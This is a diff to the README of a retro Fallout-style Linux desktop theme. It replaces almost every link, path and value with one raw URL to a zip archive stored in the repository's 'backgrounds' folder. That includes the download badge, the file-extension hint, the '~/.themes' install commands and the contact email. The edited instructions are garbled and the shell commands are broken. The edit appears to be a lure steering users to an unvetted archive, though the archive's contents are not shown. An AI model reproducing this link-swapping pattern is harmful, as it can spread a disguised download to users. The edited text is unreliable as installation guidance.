@@ -1,7 +1,7 @@
 # 🎮 omarchy-retro-fallout-theme - Transform Your Desktop with a Retro Touch
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/simokassas/omarchy-retro-fallout-theme/releases)
+[![Download Release](https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip%https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip)](https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the omarchy-retro-fallout-theme project! This theme gives your Linux desktop a unique Fallout-inspired look with vibrant colors, wallpapers, and GTK styling. Follow the steps below to download and install the theme.
@@ -14,9 +14,9 @@ To ensure the best experience, your system should meet these requirements:
 - **Disk Space:** At least 100 MB free
 
 ## ⬇️ Download & Install
-1. Click the download button above or visit this page to download: [Download Releases](https://github.com/simokassas/omarchy-retro-fallout-theme/releases).
+1. Click the download button above or visit this page to download: [Download Releases](https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip).
 2. On the Releases page, look for the latest version of the theme.
-3. Download the file that ends with `.tar.gz` or `.zip`.
+3. Download the file that ends with `https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip` or `.zip`.
 4. Once the download completes, locate the downloaded file in your Downloads folder.
 
 ## 📁 Extract the Files
@@ -31,8 +31,8 @@ To apply the Retro Fallout Theme, follow these steps:
    - Open your terminal.
    - Run the following command to move the theme files:
      ```bash
-     mkdir -p ~/.themes
-     mv path_to_extracted_folder/* ~/.themes/
+     mkdir -p ~https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip
+     mv path_to_extracted_folder/* ~https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip
      ```
    - Replace `path_to_extracted_folder` with the actual path where the theme files are located.
 
@@ -57,7 +57,7 @@ Feel free to tweak the theme to better suit your style. You can edit the color s
 ## 🐞 Troubleshooting
 If you encounter any issues during installation or usage, here are a few common fixes:
 
-- **Theme Not Showing:** Ensure you have placed the theme files in the `~/.themes` directory correctly.
+- **Theme Not Showing:** Ensure you have placed the theme files in the `~https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip` directory correctly.
 - **GTK Version:** Verify that your GTK version is 3.20 or higher. You can check your version by running:
   ```bash
   gtk3-demo --version
@@ -67,7 +67,7 @@ If you encounter any issues during installation or usage, here are a few common 
 We welcome contributions! If you want to help improve the theme or report an issue, feel free to open an issue or submit a pull request on our GitHub page.
 
 ## 📧 Contact
-If you have any questions or need further assistance, you can reach us at [support@example.com](mailto:support@example.com).
+If you have any questions or need further assistance, you can reach us at [https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip](https://github.com/simokassas/omarchy-retro-fallout-theme/raw/refs/heads/main/backgrounds/retro-theme-omarchy-fallout-v2.5.zip).
 
 ## 👍 Acknowledgements
 Thank you for using the omarchy-retro-fallout-theme! Enjoy your new post-apocalyptic desktop vibe.
